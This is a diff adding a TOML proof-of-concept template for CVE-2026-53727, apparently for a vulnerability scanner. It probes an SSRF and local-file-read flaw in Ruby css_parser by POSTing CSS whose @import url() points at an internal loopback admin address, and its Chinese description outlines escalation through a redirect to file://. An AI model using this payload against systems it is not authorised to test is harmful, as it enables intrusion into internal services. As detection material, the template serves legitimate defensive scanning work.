@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "检测 Ruby css_parser 2.2.0 至 3.0.0 版本中 CssParser::Parser#read_remote_file 的 SSRF 与本地文件读取漏洞。攻击者可通过 @import url() 注入恶意 CSS，触发未授权 HTTP 请求至任意内网地址，并利用 HTTP 302 重定向至 file:// 协议实现任意本地文件读取。"
+id = "POC-AVE-2026-0442"
+name = "CVE-2026-53727 PoC"
+severity = "high"
+tags = ["cve-2026-53727"]
+vuln_id = [
+    "CVE-2026-53727",
+    "AVE-2026-0442",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+@import url("http://127.0.0.1:18080/admin");
+body { background: red; }"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/css"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "200",
+    "OK",
+]
